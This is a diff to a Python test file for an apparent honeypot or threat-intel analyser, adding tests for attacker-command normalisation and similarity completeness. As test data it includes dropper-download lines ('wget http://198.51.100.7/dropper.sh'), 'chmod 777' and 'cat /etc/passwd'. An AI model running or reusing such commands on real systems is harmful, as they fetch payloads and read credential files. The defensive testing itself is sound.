@@ -13,6 +13,7 @@ from app.db.models import (
     TechniqueMapping,
 )
 from app.db.models import Indicator as IndicatorRow
+from app.config import get_settings
 from app.db.session import get_session_factory
 from app.seed.seeder import seed
 from app.services.analyzer import run_analysis
@@ -20,7 +21,7 @@ from app.services.compaction import compact
 from app.services.coverage import build_coverage
 from app.services.intel import correlate, extract_indicators, list_indicators
 from app.services.llm.schemas import EvidenceCitation
-from app.services.profiles import build_profile, jaccard
+from app.services.profiles import build_profile, jaccard, normalize_command
 from app.services.session_builder import get_session_events
 
 # Cleanup runs inline, at the end of each test's own coroutine (try/finally) --
@@ -377,3 +378,122 @@ async def test_coverage_marks_llm_inferred_technique_as_not_observed() -> None:
     finally:
         await _delete_analysis_and_children(analysis_id)
         await _delete_indicators_for_session("seed-unmapped-01")
+
+
+# ---------------------------------------------------------------------------
+# Command normalisation for attacker similarity.
+#
+# The design prose promised "Jaccard over NORMALISED command sets", but the
+# sets were built from raw command_line strings. Two runs of the same dropper
+# pointed at different C2 addresses shared no set members at all and scored 0
+# similarity -- the opposite of the intended result.
+#
+# Normalisation replaces the literals that vary between runs of one campaign
+# (IPv4 addresses, file hashes) with placeholders, and leaves everything that
+# carries meaning alone. It deliberately does NOT strip arguments wholesale:
+# `cat /etc/passwd` and `cat /tmp/notes` map to different ATT&CK techniques,
+# and collapsing them would destroy the signal the rest of the system runs on.
+# ---------------------------------------------------------------------------
+
+
+def test_normalisation_ignores_the_c2_address_but_keeps_the_payload_path() -> None:
+    same_payload_different_c2 = normalize_command("wget http://198.51.100.7/dropper.sh")
+    assert same_payload_different_c2 == normalize_command("wget http://203.0.113.9/dropper.sh")
+    # A different payload is a different command, C2 address notwithstanding.
+    assert same_payload_different_c2 != normalize_command("wget http://198.51.100.7/miner.sh")
+
+
+def test_normalisation_collapses_whitespace_and_case() -> None:
+    assert normalize_command("  CHMOD   777   dropper.sh ") == normalize_command(
+        "chmod 777 dropper.sh"
+    )
+
+
+def test_normalisation_ignores_a_differing_file_hash() -> None:
+    assert normalize_command("sha256sum " + "a" * 64) == normalize_command(
+        "sha256sum " + "b" * 64
+    )
+
+
+def test_normalisation_preserves_arguments_that_change_meaning() -> None:
+    # Permission bits are the whole point of the T1222.002 mapping.
+    assert normalize_command("chmod 777 f") != normalize_command("chmod 644 f")
+    # So is the file being read.
+    assert normalize_command("cat /etc/passwd") != normalize_command("cat /tmp/notes")
+
+
+def test_jaccard_scores_two_runs_of_one_campaign_as_identical_after_normalisation() -> None:
+    first = {
+        normalize_command(c)
+        for c in ("wget http://198.51.100.7/dropper.sh", "chmod 777 dropper.sh")
+    }
+    second = {
+        normalize_command(c)
+        for c in ("wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh")
+    }
+
+    assert jaccard(first, second) == 1.0
+    # Without normalisation the same two campaigns share only the chmod.
+    raw_first = {"wget http://198.51.100.7/dropper.sh", "chmod 777 dropper.sh"}
+    raw_second = {"wget http://203.0.113.9/dropper.sh", "chmod 777 dropper.sh"}
+    assert jaccard(raw_first, raw_second) < 1.0
+
+
+# ---------------------------------------------------------------------------
+# Attacker similarity completeness.
+#
+# _commands_by_ip used to walk every session and fetch its events one request
+# at a time. Replacing that with a single terms aggregation introduces a cap:
+# a terms agg returns at most `size` buckets and says nothing about what it
+# dropped. Scoring a truncated command set would produce a confident number
+# computed from a subset of the evidence -- a beautiful, wrong 0.87.
+#
+# So the aggregation reports whether each set is complete, and an incomplete
+# set withholds similarity entirely rather than scoring what survived.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+async def test_similarity_is_scored_when_every_command_set_is_complete() -> None:
+    await seed(reset=True)
+    profile = await build_profile("185.220.101.44")
+
+    assert profile is not None
+    assert profile.similarity_complete is True
+    assert profile.similarity_incomplete_reason is None
+
+
+@pytest.mark.asyncio
+async def test_similarity_is_withheld_when_the_command_cardinality_limit_is_hit(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # seed-botnet-01 alone records more commands than this, so the cap is
+    # deliberately exceeded and the aggregation must notice.
+    await seed(reset=True)
+    monkeypatch.setattr(get_settings(), "attacker_command_cardinality_limit", 2)
+
+    profile = await build_profile("185.220.101.44")
+
+    assert profile is not None
+    assert profile.similarity_complete is False
+    assert profile.similarity_incomplete_reason == "command_cardinality_limit"
+    # The point of the exercise: no score at all, rather than a score computed
+    # from whichever commands happened to survive truncation.
+    assert profile.similarity == []
+
+
+@pytest.mark.asyncio
+async def test_a_generous_cap_leaves_the_seed_corpus_complete(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # The same profile, same data, cap raised above the corpus: completeness
+    # must flip back. Without this the previous test would also pass against
+    # an implementation that simply always reports incomplete.
+    await seed(reset=True)
+    monkeypatch.setattr(get_settings(), "attacker_command_cardinality_limit", 5000)
+
+    profile = await build_profile("185.220.101.44")
+
+    assert profile is not None
+    assert profile.similarity_complete is True
+    assert profile.similarity_incomplete_reason is None
